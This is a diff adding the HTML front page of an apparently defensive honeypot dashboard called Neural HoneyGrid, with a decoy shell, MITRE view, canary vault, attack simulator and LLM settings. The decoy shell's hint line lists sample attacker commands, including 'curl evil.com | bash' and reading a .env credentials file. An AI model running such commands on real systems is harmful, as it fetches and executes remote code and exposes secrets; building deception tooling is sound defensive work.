@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Neural HoneyGrid // AI Adaptive Cyber Deception SOC</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <!-- Top HUD Header -->
+    <header>
+        <div class="logo-wrap">
+            <div class="logo-shield">🛡️</div>
+            <div class="logo-text">
+                <h1>NEURAL HONEYGRID</h1>
+                <p>AI DECEPTION & ADVERSARY PROFILING PLATFORM</p>
+            </div>
+        </div>
+
+        <div class="hud-status-bar">
+            <div class="status-badge">
+                <div class="pulse-dot"></div>
+                <span>HONEYPOT ARMED // HOST: prod-corp-sec-srv01</span>
+            </div>
+            <div id="canary-alert-pill" class="status-badge" style="display: none; background: rgba(239, 68, 68, 0.15); border-color: #ef4444; color: #f87171;">
+                <span>🚨 CANARY BREACH ACTIVE</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Metrics Ribbon -->
+    <div class="metrics-ribbon">
+        <div class="metric-card">
+            <div class="metric-info">
+                <p>Active Infiltrations</p>
+                <h3 id="metric-sessions" style="color: #38bdf8;">0</h3>
+            </div>
+            <div class="metric-icon">🌐</div>
+        </div>
+
+        <div class="metric-card">
+            <div class="metric-info">
+                <p>Intercepted Commands</p>
+                <h3 id="metric-commands" style="color: #00f3ff;">0</h3>
+            </div>
+            <div class="metric-icon">⚡</div>
+        </div>
+
+        <div class="metric-card">
+            <div class="metric-info">
+                <p>Honeytoken Breaches</p>
+                <h3 id="metric-canaries" style="color: #ef4444;">0</h3>
+            </div>
+            <div class="metric-icon">🪤</div>
+        </div>
+
+        <div class="metric-card">
+            <div class="metric-info">
+                <p>High-Threat Actors</p>
+                <h3 id="metric-threats" style="color: #fbbf24;">0</h3>
+            </div>
+            <div class="metric-icon">🎯</div>
+        </div>
+    </div>
+
+    <!-- Navigation Tabs -->
+    <div class="nav-tabs">
+        <button class="nav-tab active" data-tab="terminal-tab">
+            <span>💻</span> Live War Room & Shell
+        </button>
+        <button class="nav-tab" data-tab="mitre-tab">
+            <span>📊</span> MITRE ATT&CK Matrix
+        </button>
+        <button class="nav-tab" data-tab="canary-tab">
+            <span>🪤</span> Canary & Honeytoken Vault
+        </button>
+        <button class="nav-tab" data-tab="simulator-tab">
+            <span>⚡</span> Adversary Attack Simulator
+        </button>
+        <button class="nav-tab" data-tab="reports-tab">
+            <span>📑</span> AI Threat Reports & Sigma
+        </button>
+        <button class="nav-tab" data-tab="settings-tab">
+            <span>⚙️</span> AI Engine Config
+        </button>
+    </div>
+
+    <!-- Main Content Area -->
+    <main>
+        <!-- TAB 1: Live War Room & Terminal -->
+        <div id="terminal-tab" class="tab-content active">
+            <div class="terminal-grid">
+                <!-- Terminal Console -->
+                <div class="terminal-box">
+                    <div class="terminal-header">
+                        <div class="term-controls">
+                            <div class="term-dot dot-red"></div>
+                            <div class="term-dot dot-yellow"></div>
+                            <div class="term-dot dot-green"></div>
+                        </div>
+                        <div class="term-title">interactive_decoy_shell // session: sandbox-operator-01</div>
+                        <div style="font-size:0.7rem; color:#64748b; font-family:var(--font-mono);">GEN-AI EMULATION: ACTIVE</div>
+                    </div>
+                    <div id="terminal-body" class="terminal-body">
+                        <div class="term-line out" style="color:#38bdf8;">[+] Neural HoneyGrid Decoy Shell v1.0.0 Loaded.</div>
+                        <div class="term-line out">[+] Emulating Ubuntu 22.04 LTS (Jammy Jellyfish) - prod-corp-sec-srv01</div>
+                        <div class="term-line out">[+] Try typing commands below (e.g. `whoami`, `ls -la`, `cat /opt/api_gateway/.env`, `sudo -l`, `nmap localhost`, `curl evil.com | bash`):</div>
+                    </div>
+                    <div class="terminal-input-bar">
+                        <span id="term-prompt-label" class="term-prompt-label">admin@prod-corp-sec-srv01:~$</span>
+                        <input id="term-input" class="term-input" type="text" placeholder="Type attacker command or launch attack simulation..." autofocus autocomplete="off" spellcheck="false" />
+                    </div>
+                </div>
+
+                <!-- Active Infiltration Sessions Sidebar -->
+                <div class="sidebar-panel">
+                    <div class="sidebar-header">
+                        <span>Intercepted Sessions</span>
+                        <span style="font-size:0.7rem; color:#38bdf8;">REAL-TIME</span>
+                    </div>
+                    <div id="session-list-container" class="session-list">
+                        <!-- Populated by JS -->
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 2: MITRE ATT&CK Matrix -->
+        <div id="mitre-tab" class="tab-content">
+            <div style="margin-bottom: 1rem; display: flex; justify-content: space-between; align-items: center;">
+                <div>
+                    <h2 style="font-size: 1.25rem; font-weight: 700;">MITRE ATT&CK Enterprise Matrix Real-Time Radar</h2>
+                    <p style="font-size: 0.8rem; color: #94a3b8;">Techniques highlighted in red indicate live adversary exploitation observed by the deception engine.</p>
+                </div>
+                <button class="btn-launch" style="margin: 0; padding: 0.4rem 0.85rem;" onclick="window.mitreView.refresh()">
+                    🔄 Refresh Radar
+                </button>
+            </div>
+            <div id="mitre-matrix-container" class="mitre-grid">
+                <!-- Populated by mitre_view.js -->
+            </div>
+        </div>
+
+        <!-- TAB 3: Canary & Honeytoken Vault -->
+        <div id="canary-tab" class="tab-content">
+            <div style="margin-bottom: 1.25rem;">
+                <h2 style="font-size: 1.25rem; font-weight: 700;">Canary Honeytokens & Bait Infrastructure</h2>
+                <p style="font-size: 0.8rem; color: #94a3b8;">High-value deceptive credentials and lure files planted across the virtual filesystem. Access instantly trips SOC alerts.</p>
+            </div>
+            <div id="canary-vault-grid" class="canary-grid">
+                <!-- Populated by app.js -->
+            </div>
+        </div>
+
+        <!-- TAB 4: Adversary Attack Simulator -->
+        <div id="simulator-tab" class="tab-content">
+            <div style="margin-bottom: 1.25rem;">
+                <h2 style="font-size: 1.25rem; font-weight: 700;">Automated Adversary Attack Simulator</h2>
+                <p style="font-size: 0.8rem; color: #94a3b8;">Launch realistic automated penetration testing and threat actor scenarios to test the honeypot in real time.</p>
+            </div>
+            <div id="simulator-scenarios-container" class="sim-grid">
+                <!-- Populated by simulator_view.js -->
+            </div>
+        </div>
+
+        <!-- TAB 5: AI Threat Reports & Sigma Rules -->
+        <div id="reports-tab" class="tab-content">
+            <div class="report-container">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.25rem; flex-wrap: wrap; gap: 0.75rem;">
+                    <div>
+                        <h2 style="font-size: 1.25rem; font-weight: 700;">AI Threat Intelligence & Forensic Reports</h2>
+                        <p style="font-size: 0.8rem; color: #94a3b8;">Autonomous forensic analysis, MITRE TTP extraction, and auto-generated Sigma / SIEM rules.</p>
+                    </div>
+                    <div style="display: flex; gap: 0.5rem; align-items: center;">
+                        <select id="report-session-select" style="background:#0f172a; color:#fff; border:1px solid var(--border-color); padding:0.5rem; border-radius:6px; font-size:0.8rem;" onchange="window.app.loadSessionReport(this.value)">
+                            <!-- Populated by app.js -->
+                        </select>
+                        <button class="btn-launch" style="margin: 0; padding: 0.5rem 0.85rem;" onclick="window.app.downloadReportStix()">
+                            ⬇️ Export STIX 2.1 JSON
+                        </button>
+                    </div>
+                </div>
+                <div id="report-markdown-container" class="report-markdown-view">
+                    Select an attacker session above to render its AI Incident Report.
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 6: AI Engine Settings -->
+        <div id="settings-tab" class="tab-content">
+            <div class="report-container" style="max-width: 650px;">
+                <h2 style="font-size: 1.25rem; font-weight: 700; margin-bottom: 0.5rem;">AI Generative Engine Settings</h2>
+                <p style="font-size: 0.8rem; color: #94a3b8; margin-bottom: 1.5rem;">Neural HoneyGrid comes built-in with a zero-setup High-Fidelity Cyber Neural Emulator, or you can connect your Google Gemini, Groq, or OpenAI API keys.</p>
+
+                <div style="display: flex; flex-direction: column; gap: 1rem;">
+                    <div>
+                        <label style="display: block; font-size: 0.8rem; color: #cbd5e1; margin-bottom: 0.4rem; font-weight: 600;">LLM Provider Selection</label>
+                        <select id="llm-provider-select" style="width: 100%; background: #0f172a; border: 1px solid var(--border-color); color: #fff; padding: 0.65rem; border-radius: 6px;">
+                            <option value="auto">Auto (Best Available / Fallback to Built-in Cyber Neural Engine)</option>
+                            <option value="gemini">Google Gemini 1.5 Flash</option>
+                            <option value="groq">Groq (Llama 3.1 8B)</option>
+                            <option value="openai">OpenAI (GPT-4o-mini)</option>
+                        </select>
+                    </div>
+
+                    <div>
+                        <label style="display: block; font-size: 0.8rem; color: #cbd5e1; margin-bottom: 0.4rem; font-weight: 600;">Google Gemini API Key (Optional)</label>
+                        <input id="llm-gemini-key" type="password" placeholder="AIzaSy..." style="width: 100%; background: #0f172a; border: 1px solid var(--border-color); color: #fff; padding: 0.65rem; border-radius: 6px;" />
+                    </div>
+
+                    <div>
+                        <label style="display: block; font-size: 0.8rem; color: #cbd5e1; margin-bottom: 0.4rem; font-weight: 600;">Groq API Key (Optional)</label>
+                        <input id="llm-groq-key" type="password" placeholder="gsk_..." style="width: 100%; background: #0f172a; border: 1px solid var(--border-color); color: #fff; padding: 0.65rem; border-radius: 6px;" />
+                    </div>
+
+                    <div>
+                        <label style="display: block; font-size: 0.8rem; color: #cbd5e1; margin-bottom: 0.4rem; font-weight: 600;">OpenAI API Key (Optional)</label>
+                        <input id="llm-openai-key" type="password" placeholder="sk-..." style="width: 100%; background: #0f172a; border: 1px solid var(--border-color); color: #fff; padding: 0.65rem; border-radius: 6px;" />
+                    </div>
+
+                    <button class="btn-launch" onclick="window.app.saveLLMSettings()">
+                        💾 Save & Apply Engine Configuration
+                    </button>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Scripts -->
+    <script src="/static/js/terminal_view.js"></script>
+    <script src="/static/js/mitre_view.js"></script>
+    <script src="/static/js/simulator_view.js"></script>
+    <script src="/static/js/app.js"></script>
+</body>
+</html>
